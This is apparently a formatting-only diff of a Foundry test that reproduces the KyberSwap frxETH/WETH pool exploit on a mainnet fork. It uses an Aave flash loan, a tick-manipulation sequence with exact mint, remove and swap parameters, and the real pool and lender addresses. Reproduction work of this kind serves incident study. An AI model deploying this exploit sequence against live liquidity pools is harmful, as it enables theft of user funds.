@@ -4,7 +4,8 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "./../interface.sol";
 
-import {IBasePositionManager as IKyberswapPositionManager} from "./KyberSwap/interfaces/periphery/IBasePositionManager.sol";
+import {IBasePositionManager as IKyberswapPositionManager} from
+    "./KyberSwap/interfaces/periphery/IBasePositionManager.sol";
 import {IPool as IKyberswapPool} from "./KyberSwap/interfaces/IPool.sol";
 
 // @KeyInfo - Total Lost : ~$46M
@@ -23,13 +24,25 @@ import {IPool as IKyberswapPool} from "./KyberSwap/interfaces/IPool.sol";
 // AAVE INTERFACES ////////////////////////////////////////////////////////////
 
 interface IAavePool {
-    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes memory params, uint16 referralCode) external;
+    function flashLoanSimple(
+        address receiverAddress,
+        address asset,
+        uint256 amount,
+        bytes memory params,
+        uint16 referralCode
+    ) external;
 }
 
 // UNISWAP V3 INTERFACES //////////////////////////////////////////////////////
 
 interface IUniswapV3Pool {
-    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256 amount0, int256 amount1);
+    function swap(
+        address recipient,
+        bool zeroForOne,
+        int256 amountSpecified,
+        uint160 sqrtPriceLimitX96,
+        bytes calldata data
+    ) external returns (int256 amount0, int256 amount1);
 }
 
 // LOGGING ////////////////////////////////////////////////////////////////////
@@ -42,8 +55,16 @@ contract Logger is Test {
         return string(abi.encodePacked(text_stage, text_token, text_label));
     }
 
-    function logBalances(string memory stage_label, string memory token_label, string memory target_label, address target, address token) internal {
-        emit log_named_decimal_uint(logTag(stage_label, token_label, target_label), IERC20(token).balanceOf(target), IERC20(token).decimals());
+    function logBalances(
+        string memory stage_label,
+        string memory token_label,
+        string memory target_label,
+        address target,
+        address token
+    ) internal {
+        emit log_named_decimal_uint(
+            logTag(stage_label, token_label, target_label), IERC20(token).balanceOf(target), IERC20(token).decimals()
+        );
     }
 }
 
@@ -73,7 +94,9 @@ contract Exploiter is Test {
     }
 
     // core ///////////////////////////////////////////////////////////////////
-    function _flashCallback(uint256 due) internal returns (bool) {
+    function _flashCallback(
+        uint256 due
+    ) internal returns (bool) {
         int24 __currentTick;
         int24 __nearestCurrentTick;
         uint24 __swap_fee;
@@ -89,17 +112,42 @@ contract Exploiter is Test {
 
         // step 1: move to a tick range with 0 liquidity
         IKyberswapPool(_victim).swap(_attacker, int256(_amount), false, 0x100000000000000000000000000, "");
-        
+
         // step 2: supply liquidity
         (__sqrtP, __currentTick, __nearestCurrentTick,) = IKyberswapPool(_victim).getPoolState();
-        (__token_id,,,) = IKyberswapPositionManager(_manager).mint(IKyberswapPositionManager.MintParams(_token0, _token1, __swap_fee, __currentTick, 111310, [__nearestCurrentTick, __nearestCurrentTick], 6948087773336076, 107809615846697233, 0, 0, _attacker, block.timestamp));
+        (__token_id,,,) = IKyberswapPositionManager(_manager).mint(
+            IKyberswapPositionManager.MintParams(
+                _token0,
+                _token1,
+                __swap_fee,
+                __currentTick,
+                111_310,
+                [__nearestCurrentTick, __nearestCurrentTick],
+                6_948_087_773_336_076,
+                107_809_615_846_697_233,
+                0,
+                0,
+                _attacker,
+                block.timestamp
+            )
+        );
 
         // step 3: remove liquidity
-        IKyberswapPositionManager(_manager).removeLiquidity(IKyberswapPositionManager.RemoveLiquidityParams(__token_id, 14938549516730950591, 0, 0, block.timestamp));
+        IKyberswapPositionManager(_manager).removeLiquidity(
+            IKyberswapPositionManager.RemoveLiquidityParams(
+                __token_id, 14_938_549_516_730_950_591, 0, 0, block.timestamp
+            )
+        );
 
         // step 4: back and forth swaps
-        IKyberswapPool(_victim).swap(_attacker, 387170294533119999999, false, 1461446703485210103287273052203988822378723970341, "");
-        IKyberswapPool(_victim).swap(_attacker, -int256(IERC20(_token1).balanceOf(_victim)), false, 4295128740, "");
+        IKyberswapPool(_victim).swap(
+            _attacker,
+            387_170_294_533_119_999_999,
+            false,
+            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341,
+            ""
+        );
+        IKyberswapPool(_victim).swap(_attacker, -int256(IERC20(_token1).balanceOf(_victim)), false, 4_295_128_740, "");
 
         // repay the lender
         IERC20(_token1).approve(_lender, due);
@@ -119,7 +167,13 @@ contract Exploiter is Test {
     // flash loan / funding callbacks /////////////////////////////////////////
 
     // Aave
-    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes memory params) external returns (bool) {
+    function executeOperation(
+        address asset,
+        uint256 amount,
+        uint256 premium,
+        address initiator,
+        bytes memory params
+    ) external returns (bool) {
         return _flashCallback(amount + premium);
     }
 
@@ -136,7 +190,14 @@ contract KyberswapFrxEthWethPoolExploitTest is Exploiter, Logger {
     uint256 private constant _block = 18_630_391;
 
     // victim = KS2-RT, lender = Aave pool v3, amount = 2,000,000,000,000,000,000,000
-    constructor() Exploiter(address(0xFd7B111AA83b9b6F547E617C7601EfD997F64703), address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2), 0x6c6b935b8bbd400000) Logger() {}
+    constructor()
+        Exploiter(
+            address(0xFd7B111AA83b9b6F547E617C7601EfD997F64703),
+            address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2),
+            0x6c6b935b8bbd400000
+        )
+        Logger()
+    {}
 
     function setUp() public {
         vm.createSelectFork(_chain, _block);
